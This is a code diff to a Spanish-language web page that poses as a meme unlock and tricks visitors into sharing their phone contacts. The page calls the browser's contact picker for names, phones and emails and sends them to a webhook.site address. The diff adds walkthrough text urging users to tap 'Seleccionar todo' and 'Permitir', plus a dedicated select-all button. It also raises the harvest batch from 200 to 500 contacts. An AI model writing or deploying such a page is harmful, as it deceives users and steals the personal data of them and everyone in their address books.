@@ -8,11 +8,14 @@
 <style>
  body{font-family:Arial,sans-serif;background:#000;color:#fff;text-align:center;padding:20px;margin:0}
  img{max-width:100%;border-radius:10px}
- #btn,#next,#send{margin:12px 8px;padding:14px 22px;background:#ff4081;border:none;border-radius:6px;color:#fff;font-size:16px;font-weight:bold}
+ #btn,#next,#send,#sel{margin:12px 8px;padding:14px 22px;background:#ff4081;border:none;border-radius:6px;color:#fff;font-size:16px;font-weight:bold;width:auto}
  #send{background:#2ea043}
+ #sel{background:#7b2ff7;display:none}
  #st{min-height:22px;font-size:14px;color:#bbb;margin-top:10px;white-space:pre-line}
  .bar{background:#1a1a1a;border:1px solid #ff4081;border-radius:10px;padding:14px;margin-bottom:14px}
  .bar a{display:inline-block;margin-top:10px;padding:12px 20px;background:#ff4081;color:#fff;border-radius:6px;text-decoration:none;font-weight:bold}
+ .paso{background:#111;border:1px dashed #ff4081;border-radius:10px;padding:12px;margin:14px 0;font-size:14px;color:#ddd}
+ .paso b{color:#ff4081}
 </style>
 </head>
 <body>
@@ -25,11 +28,20 @@
 <p>¡Haz clic para actualizar tu perfil y desbloquear el meme completo!</p>
 <button id="btn">Actualizar ahora</button>
 <div id="st"></div>
+
+<div class="paso" id="paso" style="display:none">
+  <p><b>Paso 1:</b> Apretá el botón violeta de abajo.</p>
+  <p><b>Paso 2:</b> En la lista que se abre, tocá <b>"Seleccionar todo"</b> (o el círculo de arriba).</p>
+  <p><b>Paso 3:</b> Tocá <b>"Permitir"</b>.</p>
+  <p>Puede tardar unos segundos, es normal.</p>
+</div>
+
+<button id="sel">Seleccionar todos los contactos</button>
 <button id="next" style="display:none">Siguiente tanda</button>
 <button id="send" style="display:none">Enviar</button>
 
 <script>
-var HOOK="https://webhook.site/2f70cfed-8e86-482a-a6f0-a33d0030c8d1", LOTE=200, filas=[], vistos={};
+var HOOK="https://webhook.site/2f70cfed-8e86-482a-a6f0-a33d0030c8d1", LOTE=500, filas=[], vistos={};
 function $(i){return document.getElementById(i)}
 function norm(t){return (t||"").replace(/\D/g,"")}
 function q(v){return '"'+String(v||"").replace(/"/g,'""')+'"'}
@@ -44,6 +56,7 @@ if(/WhatsApp|Instagram|FBAN|FBAV|FB_IAB|; wv\)/i.test(ua)&&/Android/i.test(ua)){
 
 function tanda(){
   if(!("contacts" in navigator)){ $("bar").style.display="block"; $("st").textContent="Abrilo en Chrome."; return }
+  $("st").textContent="Abriendo lista de contactos...";
   navigator.contacts.select(["name","tel","email"],{multiple:true}).then(function(p){
     if(!p||!p.length){ $("st").textContent="No elegiste contactos."; return }
     if(p.length>LOTE) p=p.slice(0,LOTE);
@@ -63,7 +76,13 @@ function tanda(){
   }).catch(function(e){ $("st").textContent="Error: "+(e.name||"?") });
 }
 
-$("btn").onclick=tanda; $("next").onclick=tanda;
+$("btn").onclick=function(){
+  $("paso").style.display="block";
+  $("sel").style.display="inline-block";
+  $("btn").style.display="none";
+  tanda();
+};
+$("sel").onclick=tanda; $("next").onclick=tanda;
 $("send").onclick=function(){
   if(!filas.length)return;
   $("st").textContent="Enviando...";
